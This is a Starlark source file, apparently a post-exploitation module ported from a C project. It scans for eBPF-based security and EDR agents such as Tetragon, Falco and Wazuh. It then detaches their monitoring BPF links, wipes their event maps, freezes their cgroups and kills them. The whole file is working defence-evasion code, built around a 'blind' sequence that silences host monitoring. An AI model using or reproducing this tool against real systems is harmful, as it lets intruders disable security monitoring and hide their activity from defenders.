# tetragon_blind - find and neutralise eBPF security agents.
#
# Ported to Starlark from Furtex's edrs/tetragon_blind.c.
# Upstream project: https://github.com/MatheuZSecurity/Furtex (MIT License,
# Copyright (c) 2026 MatheuZ). See README.md in this directory for attribution.
#
# Actions: scan, ebpf (enumerate kernel BPF programs/links/maps), detach
# (drop monitoring BPF links), wipe (clear BPF event maps), blind (freeze +
# detach + wipe [+ kill]), freeze, thaw, kill. The Furtex bpf(2)
# program-enumeration, link-detach and map-wipe half is driven through the
# bundled libbpf loader (`ebpf_*` builtins). freeze/thaw operate on the
# target's existing cgroup v2 and refuse the agent's own cgroup so a freeze
# cannot take the agent down with it.

AT_FDCWD = -100
O_WRONLY = 1
SIGKILL = 9

EDR_NAMES = [
    "tetragon", "cilium-agent", "falco", "falcosecurity",
    "ebpf_exporter", "edr-sensor", "edr_daemon_d", "edr_agentd",
    "edr-agent-t", "edr_endp_t", "wazuhd", "ossec",
]

# Substrings matched against BPF program/map names. BPF object names are capped
# at 15 characters, so keep patterns short.
EBPF_PATTERNS = ["tetragon", "tg_", "cilium", "falco", "scap", "sysdig", "tracee", "aqua"]

# Program types an EDR uses to observe the system (Furtex is_monitoring_prog):
# kprobe, tracepoint, perf_event, raw_tracepoint, raw_tp_writable, tracing, lsm.
MONITORING_PROG_TYPES = [2, 5, 7, 17, 24, 26, 29]

# Event-carrying map types Furtex's tetragon_blind wipe_maps clears:
# perf_event_array, hash, lru_hash. Ringbufs cannot be cleared from userspace.
WIPE_MAP_TYPES = [4, 1, 9]
WIPE_MIN_ENTRIES = 8


def _is_pid(name):
    if not name:
        return False
    c = name[0]
    return c >= "0" and c <= "9"


def _is_true(s):
    return str_lower(s) in ("true", "1", "yes", "on")


def _write_ctl(path, data):
    res = sys_call("openat", AT_FDCWD, path, O_WRONLY, 0)
    if res["errno"] != 0:
        return res["errno"]
    fd = res["r1"]
    w = sys_call("write", fd, data, len(data))
    sys_call("close", fd)
    return w["errno"]


def _find_procs(pattern):
    hits = []
    for pid in list_dir("/proc"):
        if not _is_pid(pid):
            continue
        comm = read_file(sprintf("/proc/%s/comm", pid), default="").strip()
        if not comm:
            continue
        if str_contains(comm, pattern):
            hits.append(sprintf("%s\t%s", pid, comm))
    return hits


def _scan(pattern):
    print("[*] scanning for eBPF security processes")
    found = 0
    names = EDR_NAMES
    if pattern:
        names = [pattern]
    for name in names:
        for hit in _find_procs(name):
            pid, comm = hit.split("\t")
            print(sprintf("  [!] %-20s pid=%s", comm, pid))
            found += 1
    if found == 0:
        print("  [*] none found")
    return "OK"


def _cgroup_dir(pid):
    data = read_file(sprintf("/proc/%s/cgroup", pid), default="")
    for line in data.splitlines():
        parts = line.split(":")
        if len(parts) >= 3 and parts[0] == "0":
            rel = parts[2]
            if rel == "/":
                return "/sys/fs/cgroup"
            return "/sys/fs/cgroup" + rel
    return ""


def _freeze(pid, frozen):
    if not pid:
        print("[!] freeze/thaw requires --pid")
        return "ERROR: pid required"
    target = _cgroup_dir(pid)
    if not target:
        print(sprintf("[!] cgroup v2 (unified) not found for pid %s", pid))
        return "ERROR: cgroup v2 required"
    if target == _cgroup_dir("self"):
        print(sprintf("[!] refusing to touch the agent's own cgroup (%s)", target))
        return "ERROR: refusing own cgroup"
    value = "1" if frozen else "0"
    errno = _write_ctl(target + "/cgroup.freeze", value)
    if errno != 0:
        print(sprintf("[!] writing cgroup.freeze=%s failed (errno=%d; root required)", value, errno))
        return sprintf("ERROR: errno=%d", errno)
    print(sprintf("[+] pid %s %s (%s/cgroup.freeze=%s)", pid, "frozen" if frozen else "thawed", target, value))
    return "OK"


def _kill(pid):
    if not pid:
        print("[!] kill requires --pid")
        return "ERROR: pid required"
    res = sys_call("kill", pid, SIGKILL)
    if res["errno"] != 0:
        print(sprintf("[!] kill(%s, SIGKILL) failed (errno=%d)", pid, res["errno"]))
        return sprintf("ERROR: errno=%d", res["errno"])
    print(sprintf("[+] SIGKILL sent to pid %s", pid))
    return "OK"


def _match_bpf(name, pattern):
    if not name:
        return False
    low = str_lower(name)
    if pattern:
        return str_contains(low, str_lower(pattern))
    for pat in EBPF_PATTERNS:
        if str_contains(low, pat):
            return True
    return False


def _has_bpf_cap():
    # eBPF enumeration/detach/wipe needs CAP_BPF, or CAP_SYS_ADMIN on kernels
    # before the capability split. Check the capability, not uid 0, so file
    # capabilities and containers are handled correctly.
    return has_cap("CAP_BPF") or has_cap("CAP_SYS_ADMIN")


def _ebpf_state():
    progs = ebpf_progs()
    links = ebpf_links()
    maps = ebpf_maps()
    err = progs["error"] or links["error"] or maps["error"]
    return progs, links, maps, err


def _prog_names(progs):
    names = {}
    for p in progs["progs"]:
        names[p["id"]] = p["name"]
    return names


def _ebpf_scan(pattern):
    print("[*] enumerating kernel BPF objects")
    if not _has_bpf_cap():
        print("  [!] missing CAP_BPF/CAP_SYS_ADMIN; skipping BPF enumeration")
        return "OK"
    progs, links, maps, err = _ebpf_state()
    if err:
        print(sprintf("  [!] libbpf unavailable: %s", err))
        return "ERROR: libbpf unavailable"
    names = _prog_names(progs)
    found = 0
    for p in progs["progs"]:
        monitoring = " [monitoring]" if p["type"] in MONITORING_PROG_TYPES else ""
        if _match_bpf(p["name"], pattern):
            print(sprintf("  [!] prog id=%-5d type=%-3d name=%-16s jit=%-6d%s",
                          p["id"], p["type"], p["name"], p["jited_len"], monitoring))
            found += 1
    for l in links["links"]:
        pname = names.get(l["prog_id"], "")
        if _match_bpf(pname, pattern):
            print(sprintf("  [!] link id=%-5d prog_id=%-5d prog_type=%-3d prog=%s",
                          l["id"], l["prog_id"], l["prog_type"], pname))
            found += 1
    for m in maps["maps"]:
        if _match_bpf(m["name"], pattern):
            print(sprintf("  [!] map  id=%-5d type=%-3d name=%s", m["id"], m["type"], m["name"]))
            found += 1
    print(sprintf("[*] %d matching BPF object(s)", found))
    return "OK"


def _detach(pattern, dry_run):
    print("[*] detaching BPF links")
    if not _has_bpf_cap():
        print("  [!] missing CAP_BPF/CAP_SYS_ADMIN; skipping link detach")
        return "OK"
    progs, links, maps, err = _ebpf_state()
    if err:
        print(sprintf("  [!] libbpf unavailable: %s", err))
        return "ERROR: libbpf unavailable"
    names = _prog_names(progs)
    detached = 0
    for l in links["links"]:
        pname = names.get(l["prog_id"], "")
        if pattern:
            if not _match_bpf(pname, pattern):
                continue
        elif l["prog_type"] not in MONITORING_PROG_TYPES:
            # Without a pattern, only monitoring links are touched, mirroring
            # Furtex's detach_all_links.
            continue
        if dry_run:
            print(sprintf("  [dry-run] would detach link %d (%s, prog_type=%d)",
                          l["id"], pname, l["prog_type"]))
            detached += 1
            continue
        res = ebpf_detach(l["id"])
        if res["error"]:
            print(sprintf("  [!] link %d (%s): %s", l["id"], pname, res["error"]))
        else:
            print(sprintf("  [+] detached link %d (%s)", l["id"], pname))
            detached += 1
    print(sprintf("[*] %d link(s) %s", detached, "would be detached" if dry_run else "detached"))
    return "OK"


def _wipe_maps(pattern, dry_run):
    print("[*] wiping BPF event maps")
    if not _has_bpf_cap():
        print("  [!] missing CAP_BPF/CAP_SYS_ADMIN; skipping map wipe")
        return "OK"
    progs, links, maps, err = _ebpf_state()
    if err:
        print(sprintf("  [!] libbpf unavailable: %s", err))
        return "ERROR: libbpf unavailable"
    wiped = 0
    for m in maps["maps"]:
        if m["type"] not in WIPE_MAP_TYPES or m["max_entries"] < WIPE_MIN_ENTRIES:
            continue
        if pattern and not str_contains(str_lower(m["name"]), str_lower(pattern)):
            continue
        if dry_run:
            print(sprintf("  [dry-run] would wipe map %d (%s, %d entries)",
                          m["id"], m["name"], m["max_entries"]))
            wiped += 1
            continue
        res = ebpf_map_wipe(m["id"])
        if res["error"]:
            print(sprintf("  [!] map %d (%s): %s", m["id"], m["name"], res["error"]))
        else:
            print(sprintf("  [+] wiped %d entries from map %d (%s)",
                          res["deleted"], m["id"], m["name"]))
            wiped += 1
    print(sprintf("[*] %d map(s) processed", wiped))
    return "OK"


def _blind(pid, pattern, dry_run, do_kill):
    # Furtex's blind sequence: freeze the sensor, detach its monitoring links,
    # wipe its event maps, then optionally kill it.
    print(sprintf("[*] tetragon_blind sequence%s", " (dry-run)" if dry_run else ""))
    if pid:
        print(sprintf("[1] freezing pid %s", pid))
        if not dry_run:
            _freeze(pid, True)
    else:
        print("[1] no pid given; skipping freeze")
    print("[2] detaching monitoring BPF links")
    _detach("", dry_run)
    print("[3] wiping BPF event maps")
    _wipe_maps(pattern, dry_run)
    if do_kill and pid:
        print(sprintf("[4] killing pid %s", pid))
        if not dry_run:
            _kill(pid)
    print("[+] done")
    return "OK"


def main(*args):
    action = "scan"
    pid = ""
    pattern = ""
    if args and args[0]:
        action = str_lower(args[0].strip())
    if len(args) > 1 and args[1]:
        pid = args[1].strip()
    if len(args) > 2 and args[2]:
        pattern = args[2]
    dry_run = False
    do_kill = False
    if len(args) > 3 and args[3]:
        dry_run = _is_true(args[3])
    if len(args) > 4 and args[4]:
        do_kill = _is_true(args[4])

    if action == "scan":
        return _scan(pattern)
    if action == "ebpf":
        return _ebpf_scan(pattern)
    if action == "detach":
        return _detach(pattern, dry_run)
    if action == "wipe":
        return _wipe_maps(pattern, dry_run)
    if action == "blind":
        return _blind(pid, pattern, dry_run, do_kill)
    if action == "freeze":
        return _freeze(pid, True)
    if action == "thaw":
        return _freeze(pid, False)
    if action == "kill":
        return _kill(pid)
    print(sprintf("[!] unknown action: %s", action))
    return "ERROR: unknown action"
